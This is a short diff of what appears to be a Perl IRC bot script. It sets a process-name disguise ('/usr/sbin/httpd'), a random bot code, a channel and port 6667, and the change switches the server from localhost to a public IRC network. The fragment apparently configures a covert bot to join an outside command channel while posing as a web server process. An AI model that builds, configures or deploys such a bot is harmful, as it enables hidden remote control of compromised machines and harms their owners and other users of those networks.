@@ -2,7 +2,7 @@
 
 use IO::Socket;
 my $processo = '/usr/sbin/httpd';
-my $server  = "127.0.0.1"; 
+my $server  = "irc.freenode.net"; 
 my $code = int(rand(100000));
 my $channel = "#channel";
 my $port    =   "6667";
